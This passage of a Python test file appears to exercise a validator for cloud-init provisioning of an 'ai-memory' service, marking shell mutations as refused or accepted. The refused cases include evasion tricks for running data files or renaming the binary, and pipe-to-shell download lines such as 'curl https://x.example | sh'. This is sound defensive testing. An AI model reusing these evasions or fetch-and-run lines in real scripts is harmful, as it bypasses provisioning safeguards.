        ('nameref declared with a quoted -n behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      typeset \'-n\' R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
        ('nameref declared with an escaped -n in a function behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      f() { local \\-n R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats; }; f\n' + dec)]),
        ('nameref declared by an expanded option behind taskset, listed (#4837 R12 R4, #5323)', [(dec, '      F=n; declare -$F R=A; A=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$R" --db /x stats\n' + dec)]),
        ('second name of a declare -n written behind taskset, listed (#4837 R12 R4, #5324)', [(dec, '      B=/usr/bin/true; declare -n R=A S; S=B; S=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$B" --db /x stats\n' + dec)]),
        ('wrapper and ai-memory in one blank-split value behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      A="/usr/bin/env /usr/local/lib/ai-memory/bin/ai-memory"; taskset -c 0 $A --db /x stats\n' + dec)]),
        ('glob after a blank in one value behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      C="-c 0 /usr/local/lib/ai-memory/bin/ai-mem*"; taskset $C --db /x stats\n' + dec)]),
        ('value split by a literal IFS character behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      IFS=:; A=/usr/bin/true:/x; taskset -c 0 $A --db /x stats\n' + dec)]),
        ('IFS set to a value the gate cannot read, then a value behind taskset, listed (#4837 R12 R4, #5327)', [(dec, '      IFS=$(printf :); A=/usr/bin/true:/x; taskset -c 0 $A --db /x stats\n' + dec)]),
        ('ai-memory through a variable behind taskset, listed (#4837 R12 R4)', [(dec, '      AIM=/usr/local/lib/ai-memory/bin/ai-memory; taskset -c 0 "$${AIM}" --db $${X} stats\n' + dec)]),
        ('shell run by an unknown wrapper, listed (#4837 R12 R4)', [(dec, "      taskset -c 0 sh -c '/usr/local/lib/ai-memory/bin/ai-memory --db $${X} stats'\n" + dec)]),
        ('ai-memory copied to another name with cp, listed (#4837 R12 R4)', [(dec, '      cp /usr/local/lib/ai-memory/bin/ai-memory /usr/local/bin/aim\n' + dec)]),
        ('ai-memory linked to another name with ln -s, listed (#4837 R12 R4)', [(dec, '      ln -s /usr/local/lib/ai-memory/bin/ai-memory /usr/local/bin/aim\n' + dec)]),
        ('ai-memory installed under another name, listed (#4837 R12 R4)', [(dec, '      install -m 0755 /usr/local/lib/ai-memory/bin/ai-memory /usr/local/bin/aim\n' + dec)]),
        ('ai-memory moved to another name through a variable, listed (#4837 R12 R4)', [(dec, '      AIM=/usr/local/lib/ai-memory/bin/ai-memory; mv "$${AIM}" /usr/local/bin/aim\n' + dec)]),
        ('no-shebang write_files file run by bash from the script, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/run.conf\n" + dec)]),
        ('data-home file run through an extglob, listed (#4837 R12 R5, #5095 R11)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      shopt -s extglob; bash /etc/ai-memory/@(run).conf\n" + dec)]),
        ('ai-memory named by an extglob, listed (#4837 R12 R4, #5095 R11)', [(dec, "      shopt -s extglob; /usr/local/lib/ai-memory/bin/ai-@(memory) --db /x stats\n" + dec)]),
        ('ai-memory copied by a bare !() extglob argument, listed (#4837 R12 R4, #5325)', [(dec, '      shopt -s extglob; cd /usr/local/lib/ai-memory/bin; cp !(x) /usr/local/bin/aim\n' + dec)]),
        ('ai-memory run by a !() extglob at command position, listed (#4837 R12 R4, #5325)', [(dec, '      shopt -s extglob; cd /usr/local/lib/ai-memory/bin; !(x) --db /x stats\n' + dec)]),
        ('ai-memory run by a !() extglob after if, listed (#4837 R12 R4, #5325)', [(dec, '      shopt -s extglob; cd /usr/local/lib/ai-memory/bin; if !(x) --db /x stats; then :; fi\n' + dec)]),
        ('data-home file run through a doubled slash, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc//ai-memory/run.conf\n" + dec)]),
        ('data-home file run through a ./ segment, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/./run.conf\n" + dec)]),
        ('data-home file run through a ../ segment, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/../ai-memory/run.conf\n" + dec)]),
        ('data-home file run through a brace, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash /etc/ai-memory/run.con{f,x}\n" + dec)]),
        ('data-home file run by a relative name, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash etc/ai-memory/run.conf\n" + dec)]),
        ('data-home file run through a parameter operator, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      D=/etc/ai-memory/\n      bash \"$${D%/}/run.conf\"\n" + dec)]),
        ('data-home file run through a directory from a substitution, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      D=$(echo /etc/ai-memory); bash \"$${D}/run.conf\"\n" + dec)]),
        ('data-home file run by a loop variable, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      for f in /etc/ai-memory/run; do bash \"$f.conf\"; done\n" + dec)]),
        ('data-home file run by words piped to xargs, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      printf %s /etc/ai-memory/run.conf | xargs taskset -c 0\n" + dec)]),
        ('data-home file run by a dot after PATH, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      PATH=/etc/ai-memory:$PATH; . run.conf\n" + dec)]),
        ('data-home file run as an unresolved operand, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=$(cat /etc/x); bash \"$${F}\"\n" + dec)]),
        ('data-home file run as an unresolved stdin target, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      read F < /etc/x; bash < \"$${F}\"\n" + dec)]),
        ('data-home file run through a default operator on an empty name, listed (#4837 R12 R5, #5173)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      A=; bash "$${A:-/etc/ai-memory/run.conf}"\n' + dec)]),
        ('data-home file run through a suffix operator, listed (#4837 R12 R5, #5173)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      A=/etc/ai-memory/run.conf.x; bash "$${A%.x}"\n' + dec)]),
        ('data-home file run through an append-built path, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/run; F+=.conf; bash "$F"\n' + dec)]),
        ('data-home file run through an append-built path with a suffix, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/run; F+=.conf; bash "$F".x\n' + dec)]),
        ('data-home file copied through an append chain past the value cap, listed (#4837 R12 R5, #5329)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=u; F+=n; F+=.; F+=c; F+=o; F+=n; F+=f; cp "$F" /usr/local/bin/\n' + dec)]),
        ('data-home file copied through an append repeated by a loop, listed (#4837 R12 R5, #5330)', [(PROV, wf("/etc/ai-memory/aaa", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/a; for i in 1 2; do F+=a; done; cp "$F" /usr/local/bin/\n' + dec)]),
        ('data-home file copied through a split append value, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=/etc/ai-memory/r; F+=\"un.conf /x\"; cp $F /usr/local/bin/\n" + dec)]),
        ('data-home file copied through a field of an IFS split, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      IFS=:; F=x:/etc/ai-memory/r; F+=u*; cp $F /usr/local/bin/\n" + dec)]),
        ('data-home file copied through a nameref, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      F=/etc/ai-memory/r; F+=un.conf; declare -n R=F; cp \"$R\" /usr/local/bin/\n" + dec)]),
        ('data-home file built through a nameref and copied through its target, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      declare -n R=G; R=/etc/ai-memory/r; R+=un.conf; cp \"$G\" /usr/local/bin/\n" + dec)]),
        ('data-home file run through a nameref, listed (#4837 R12 R5, #5174)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      declare -n R=A; A=/etc/ai-memory/run.conf; bash "$R"\n' + dec)]),
        ('data-home file copied by tee from its stdin, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      tee /usr/local/bin/r.sh < /etc/ai-memory/run.conf > /dev/null\n      bash /usr/local/bin/r.sh\n" + dec)]),
        ('data-home file copied by sed in a redirected group, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      { sed 's/a/a/' /etc/ai-memory/run.conf; } > /usr/local/bin/r.sh\n      bash /usr/local/bin/r.sh\n" + dec)]),
        ('data-home file named by echo in a substitution, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      taskset -c 0 \"$(echo /etc/ai-memory/run.conf)\".x\n      bash /usr/local/bin/r.sh\n" + dec)]),
        ('data-home file read by tee in a substitution, then the copy run, listed (#4837 R12 R5, #5096)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      taskset -c 0 \"$(tee < /etc/ai-memory/run.conf)\".x\n      bash /usr/local/bin/r.sh\n" + dec)]),
        ('data-home file run by a unit ExecStartPre through a doubled slash, listed (#4837 R12 R5, #5095)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (ENVF, ENVF + "      ExecStartPre=/bin/sh /etc//ai-memory/run.conf\n")]),
        ('no-shebang write_files file run as a command, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      /etc/ai-memory/run.conf\n" + dec)]),
        ('no-shebang write_files file at mode 0755, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0755", ["${X} --db /x stats"]))]),
        ('no-shebang write_files file outside the data homes, listed (#4837 R12 R5)', [(PROV, wf("/etc/default/ai-memory-run", "0644", ["${X} --db /x stats"]))]),
        ('no-shebang write_files file named by an absolute glob, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      for f in /etc/ai-memory/*.conf; do . \"$f\"; done\n" + dec)]),
        # the directory is not named ai-memory, so only the parent-directory test sees it
        ('no-shebang write_files file run through its directory, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/hooks.d/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory/hooks.d\n" + dec)]),
        ('data file made executable by chmod, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      chmod 0755 /etc/ai-memory/run.conf\n" + dec)]),
        ('data file read by sed with an e flag, listed (#4837 R12 R5)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      sed -n 's/a/b/e' /etc/ai-memory/run.conf\n" + dec)]),
        ('heredoc written to a data home then run, listed (#4837 R12 R5)', [(dec, "      cat > /etc/ai-memory/run.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n      bash /etc/ai-memory/run.conf\n" + dec)]),
        ('heredoc written by tee, listed (#4837 R12 R5)', [(dec, "      tee /etc/ai-memory/run.conf >/dev/null <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
        # the first assignment names a data home: only the single-assignment test keeps D from being a constant
        ('heredoc through a variable assigned twice, listed (#4837 R12 R5)', [(dec, '      D=/etc/ai-memory\n      D=/usr/local/bin\n      cat > "$${D}/run.conf" <<\'EOF\'\n      ${X} --db /x stats\n      EOF\n' + dec)]),
        ('ai-memory terraform value in a redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x >${X} stats\n' + dec)]),
        ('ai-memory terraform value in a separate redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --db /x 2> ${X} stats\n' + dec)]),
        ('ai-memory quoted terraform value in a stdin redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory <"${X}" stats\n' + dec)]),
        ('ai-memory directive in a redirection target, listed (#4837 R12 R3, #5099)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory 2>%{ if c }/x%{ endif } stats\n' + dec)]),
        ("eval indented below the content block, listed (#4836)", [(dec, dec + '    eval "$PRE"\n')]),
        ("eval indented to the write_files key, listed (#4836)", [(dec, dec + '  eval "$PRE"\n')]),
        ("write_files encoding b64, listed", [(PROV, "  - path: /etc/x.sh\n    encoding: b64\n    content: |\n      Y3VybCBodHRwczovL3g=\n" + PROV)]),
        # pins for range checks no probe reached (each mutant survived the tip self-test)
        ('tar --to-command naming the binary, listed (#4837 R12 R4 pin, #5100)', [(dec, '      tar -xf /x.tar --to-command /usr/local/lib/ai-memory/bin/ai-memory\n' + dec)]),
        ('ai-memory flag word holding an expansion, listed (#4837 R12 R1 pin, #5100)', [(dec, '      /usr/local/lib/ai-memory/bin/ai-memory --$${F} stats\n' + dec)]),
        ('data file copied by install without -d, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      install -m 0755 /etc/ai-memory/run.conf /usr/local/bin/x\n" + dec)]),
        ('data file run from an executed heredoc file, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      cat > /etc/ai-memory/b.conf <<'EOF'\n      bash /etc/ai-memory/run.conf\n      EOF\n      bash /etc/ai-memory/b.conf\n" + dec)]),
        ('heredoc fed to batch, listed (#4837 R12 R5 pin, #5100)', [(dec, "      batch > /etc/ai-memory/run.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
        ('data file run inside sh -c after cd, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      sh -c 'cd /etc/ai-memory && bash run.conf'\n" + dec)]),
        ('data file run inside a command substitution, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      echo "$(bash /etc/ai-memory/run.conf)"\n' + dec)]),
        ('heredoc fed to cat with only stderr redirected, listed (#4837 R12 R5 pin, #5100)', [(dec, "      cat 2>/etc/ai-memory/x.conf <<'EOF'\n      ${X} --db /x stats\n      EOF\n" + dec)]),
        # pins for checks no probe reached in round 11 (each mutant survived the self-test, #5100)
        ('data file run by a relative name inside bash -c after cd, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      bash -c 'cd /etc; . ai-memory/run.conf'\n" + dec)]),
        ('unknown command with an operand built from an expansion after a slash, listed (#4837 R12 R4 pin, #5100)', [(dec, '      foo /opt/$N stats\n' + dec)]),
        ('find -exec with no binary operand, listed (#4837 R12 R4 pin, #5100)', [(dec, "      find /opt -name x -exec touch /opt/y ';'\n" + dec)]),
        ('cp under xargs with no binary operand, listed (#4837 R12 R4 pin, #5100)', [(dec, '      ls /opt | xargs cp -t /opt/x\n' + dec)]),
        ('data file under a root directory operand, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      foo /\n' + dec)]),
        ('data file written to a path with a dot segment, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/./run.conf", "0644", ["${X} --db /x stats"])), (dec, '      bash /etc/ai-memory/run.conf\n' + dec)]),
        ('data file named by two variables assigned twice, listed (#4837 R12 R5 pin, #5100)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; P=/etc/ai-; Q=memory/run.conf; Q=memory/run.conf; bash "$P$Q"\n' + dec)]),
        ('data file named by a variable expansion past the cap, listed (#4837 R12 R5, #5139)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      for A in /etc/ai- a2 a3 a4 a5 a6 a7 a8 a9; do for B in memory/run.conf b2 b3 b4 b5 b6 b7 b8 b9; do bash "$A$B"; done; done\n' + dec)]),
    ]
    for lbl, muts in listed:
        red("R3-C listed " + lbl, muts, autolist=True)
    # a data home shares the binary's basename: running from it is red for R5, never as an R4 wrapper (#4998)
    red("R3-C listed data home run by run-parts is an R5 hit, not an R4 wrapper (#4998)",
        [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, "      run-parts /etc/ai-memory\n" + dec)],
        autolist=True, present="is an expansion or command substitution")
    # a name read from input keeps every literal it is assigned: the read may run after
    # the use, may not run, or may run in a pipeline subshell, so this #5100 green form is
    # red now (#5356, 5-agent vote 4d3ea1c5)
    red('R3-C read names keep the literals they are assigned (#5100, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-; Q=memory/run.conf; read P Q < /dev/null; curl "$P$Q"\n' + dec)], autolist=True)
    red('data-home file copied before a later read of the same name, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=un.conf; cp "$F" /usr/local/bin/; read F\n' + dec)], autolist=True)
    red('data-home file copied after a read that may not run, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/etc/ai-memory/r; F+=un.conf; if false; then read F; fi; cp "$F" /usr/local/bin/\n' + dec)], autolist=True)
    red('data-home file copied after a read in a pipeline subshell, listed (#4837 R12 R5, #5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/etc/ai-memory/r; P+=un.conf; echo x | read P; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
    green('data-home file kept as data next to a read into a name that never held a data-home path (#5356)', [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      P=/srv/x; read P < /dev/null; cp "$P" /usr/local/bin/\n' + dec)], autolist=True)
    green("data-home file kept as data next to split and appended names that do not name it (#5356)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} --db /x stats"])), (dec, '      F=/var/r; F+="un.conf /x"; cp $F /usr/local/bin/; IFS=:; G=x:/var/r; G+=u*; cp $G /usr/local/bin/\n' + dec)], autolist=True)
    # the second name of a declare -n is a nameref: a value built from an expansion that is
    # assigned to it is refused for its own reason, not only through the unrelated glob hit (#5324, #5445)
    red('nameref declared with a second name, then assigned a value built from an expansion, listed (#5324, #5445)', [(dec, '      declare -n A=X B; B=TAR_$T\n' + dec)], autolist=True, present="nameref target built from an expansion")
    green("R3-C YAML comment line in runcmd is inert", [(RUNCMD, RUNCMD + "  # curl https://x.example | sh\n")])
    P.append(("R3-C AWS-only line copied into do-hive", "red", dict(do=[(dec, "      chown aimemory:aimemory /etc/ai-memory/store-url\n" + dec)], autolist=False)))
    # ---- validators
    red("V store-url permissions '0644'", [(STORE_PERM, STORE_PERM.replace("0600", "0644"))])
    red("V store-url permissions line removed", [(STORE_PERM, "  - path: /etc/ai-memory/store-url\n")])
    red("V chmod of the store-url to 0640", [(CHMOD, CHMOD.replace("0600", "0640"))])
    red("V write_files encoding: b64", [(STORE_PERM, STORE_PERM + "    encoding: b64\n")])
    red("V write_files !!binary content", [(PROV, "  - path: /etc/x\n    content: !!binary |\n      eA==\n" + PROV)])
    red("V write_files source: uri", [(PROV, "  - path: /etc/x\n    source:\n      uri: https://e/x\n" + PROV)])
    red("V curl failure ignored", [ins(RELOAD, ["curl -fsSL https://e -o /x || true"])])
    red("V tar extract failure ignored", [ins(RELOAD, ["tar -xzf /x -C /y || true"])])
    red("V unit binary in the service home", [(EXEC, EXEC.replace(BIN, "/opt/ai-memory/bin/ai-memory"))])
    red("V redirect writes the unit binary", [ins(RELOAD, ["printf x > " + BIN], before=True)])
    red("V tee writes the unit binary", [ins(RELOAD, ["printf x | tee " + BIN], before=True)])
    red("V password= in a unit", [(ENVF, ENVF + "      Environment=DB_ARGS=password=" + PW + "\n")])
    red("V SQL PASSWORD literal on a psql argv", [ins(EXT, ["sudo -u postgres psql -c \"ALTER USER aimemory WITH PASSWORD '" + PW + "';\""])])
    red("V terraform secret into user-data", [ins(EXT, ["echo \"${db_password}\" > /etc/x"])])
    red("V AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS alone", [(ENVF, ENVF + "      Environment=AI_MEMORY_STORE_URL_FILE_ALLOW_LAX_PERMS=1\n")])
    red("V PGPASSFILE in provision", [ins(EXT, ["export PGPASSFILE=/root/.pgpass"])])
    # ---- structure
    red("Y write_files entry not led by path", [(PROV, "  - permissions: '0644'\n    path: /etc/x\n" + PROV)], autolist=False)
    red("Y folded content scalar", [(PROV, "  - path: /etc/x\n    content: >\n      curl https://e\n" + PROV)])
    red("Y runcmd block-scalar item", [(RUNCMD, RUNCMD + "  - |\n    curl https://e | sh\n")])
    red("Y runcmd item spanning lines", [(RUNCMD, RUNCMD + "  - \"curl\n    https://e\"\n")])
    red("Y unterminated heredoc", [ins(RELOAD, ["cat > /etc/x <<EOF", "a"], before=True)])
    red("Y tab in YAML indentation", [(RUNCMD, RUNCMD + "\t- [true]\n")])
    # ---- condition 5: normalisation and comments
    green("C5 extra blanks inside a listed line", [(RELOAD, "      systemctl    daemon-reload   \n")])
    green("ai-memory --db=\"$DB\" before a literal subcommand (#4837 R7)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db="$DB" stats\n')], autolist=True)
    green("ai-memory --db \"$DB\" before a literal subcommand (#4837 R8)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db "$DB" stats\n')], autolist=True)
    green("ai-memory --db \"$${X}\" shell variable, braced (#4837 R11)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db "$${X}" stats\n')], autolist=True)
    green("ai-memory --db=\"/x/$${X}\" shell variable quoted as a whole (#4837 R11)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db="/x/$${X}" stats\n')], autolist=True)
    # #4837 R12 green forms: the closed grammar keeps every legitimate shape.
    green("ai-memory bare literal --db value (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db /var/lib/ai-memory/x.db stats\n')], autolist=True)
    green("ai-memory --db=/x literal (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --db=/x --json stats >/dev/null 2>&1\n')], autolist=True)
    green("ai-memory \"$${DB}/x\" braced variable and literal (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --agent-id "ai:$${H}" --db "$${DB}/x" stats\n')], autolist=True)
    green("ai-memory --version with redirections before any subcommand (#4837 R12 R1)", [(RELOAD, RELOAD + '      /usr/local/lib/ai-memory/bin/ai-memory --version >/dev/null 2>&1\n      /usr/local/lib/ai-memory/bin/ai-memory --db /x 2> /dev/null stats\n')], autolist=True)
    green("ai-memory under sudo -u (#4837 R12 R4)", [(RELOAD, RELOAD + '      sudo -u aimemory /usr/local/lib/ai-memory/bin/ai-memory --db /x stats\n')], autolist=True)
    green("resolved literal variable as an operand and quoted JSON brace (#4837 R12 R4, #5094)", [(RELOAD, RELOAD + '      L=/var/log/x.log; chmod 0640 "$${L}"\n      echo "$${H}" "{\\"a\\": 1}" >/dev/null\n      printf %s "$(date)"\n')], autolist=True)
    green("data-home file named in canonical-equal spellings by safe commands only (#4837 R12 R5, #5095)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} = 1"])), (RELOAD, RELOAD + '      chown root:aimemory /etc//ai-memory/./run.conf\n      D=/etc/ai-memory\n      chmod 0640 "$${D}/run.conf"\n      systemctl restart ai-memory\n')], autolist=True)
    green("data-home file read by safe commands whose output is discarded (#4837 R12 R5, #5096)", [(PROV, wf("/etc/ai-memory/run.conf", "0644", ["${X} = 1"])), (RELOAD, RELOAD + "      printf %s /etc/ai-memory/run.conf > /dev/null\n      chmod 0640 /etc/ai-memory/run.conf > /dev/null 2>&1\n      { echo a; } > /var/log/x\n")], autolist=True)
    green("ai-memory installed keeping its name (#4837 R12 R4)", [(RELOAD, RELOAD + '      install -m 0755 /opt/x/ai-memory /usr/local/lib/ai-memory/bin/ai-memory\n      cp /opt/x/ai-memory /opt/y/\n      [ -x /usr/local/lib/ai-memory/bin/ai-memory ] || echo "no /usr/local/lib/ai-memory/bin/ai-memory"\n')], autolist=True)
    green("data file in a data home handled by chown/chmod/sed (#4837 R12 R5)", [(PROV, wf("/etc/ai-memory/peer.conf", "0640", ["${X} --db /x stats"])), (RELOAD, RELOAD + "      chown root:aimemory /etc/ai-memory/peer.conf\n      chmod 0640 /etc/ai-memory/peer.conf\n      chmod 0750 /etc/ai-memory\n      P=\"$(sed -n 's#^a=##p' /etc/ai-memory/peer.conf)\"\n")], autolist=True)
    green("data heredoc into a data home through a constant (#4837 R12 R5)", [(RELOAD, RELOAD + "      CFG=/etc/ai-memory/h\n      cat > \"$${CFG}/x.conf\" <<'EOF'\n      ${X} = 1\n      EOF\n")], autolist=True)
    green("negated subshell with a blank after ! is not an extended glob (#5325)", [(RELOAD, RELOAD + "      if ! (true); then :; fi\n      ! (false) || true\n")], autolist=True)
    green("literal variable names with expanded values only (#5326)", [(RELOAD, RELOAD + '      export PATH="$${PATH}:/opt/x"; declare -x LANG=C; printf -v OUT %s "$${X}"; env LC_ALL=C true\n')], autolist=True)
    green("IFS restored from a name that only holds $IFS, then a resolved operand (#5327)", [(RELOAD, RELOAD + '      O=$IFS; IFS=:; IFS=$O; A=/usr/bin/true; taskset -c 0 "$A" --db /x stats\n')], autolist=True)
    green("tar option values and redirections that are expansions (#5328)", [(RELOAD, RELOAD + '      DL=/root; L=/x; tar -xzf "$DL/b.tar" --no-same-owner -C "$DL/x" ai-memory > "$L"\n      tar xfC "$DL/b.tar" "$DL/y"\n      tar -xf"$DL/b.tar" -C /opt/x\n')], autolist=True)
    green("C5 provision comment mentioning curl", [ins(RELOAD, ["# curl -fsSL https://e | sh"], before=True)])
    green("C5 unit comment naming ExecStart", [(ENVF, ENVF + "      # ExecStart=/bin/evil\n")])
    green("C5 YAML comment", [(RUNCMD, "  # curl https://e | sh\n" + RUNCMD)])
    red("C5 comment inside a heredoc body", [ins(RELOAD, ["cat > /etc/x.conf <<'EOF'", "# curl https://e | sh", "EOF"], before=True)],
        autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
    red("C5 comment inside an open multi-line quote", [ins(RELOAD, ["X=\"a", "# curl https://e | sh", "b\""], before=True)], autolist=False)
    red("C5 comment after a continuation", [ins(RELOAD, ["echo a \\", "# curl https://e | sh"], before=True)], autolist=False)
    # an allow entry names the words bash sees, not the line with its blanks squeezed (#5097)
    red("C5 extra blank inside a quoted string of a listed line (#5097)", [('"pin mismatch: $1', '"pin  mismatch: $1')], autolist=False)
    red("C5 tab inside a quoted string of a listed line (#5097)", [('"pin mismatch: $1', '"pin\tmismatch: $1')], autolist=False)
    red("C5 continuation turned into an escaped blank on a listed line (#5097)", [('git init -q "$2" \\\n          && git -C "$2" remote add', 'git init -q "$2" \\ && git -C "$2" remote add')], autolist=False)
    green("C5 extra indentation on a continued listed line (#5097)", [('\n          && git -C "$2" remote add', '\n             && git -C "$2" remote add')])
    # ---- condition 4: unlisted token lines
    red("C4 unlisted runcmd line", [(RUNCMD, RUNCMD + "  - [curl, -o, /x, https://e]\n")], autolist=False)
    red("C4 unlisted line in write_files data", [(DSNFILE + "\n", DSNFILE + "\n      x https://e\n")], autolist=False)
    red("C4 unlisted line in a unit", [(ENVF, ENVF + "      ExecStartPre=/bin/true\n")], autolist=False)
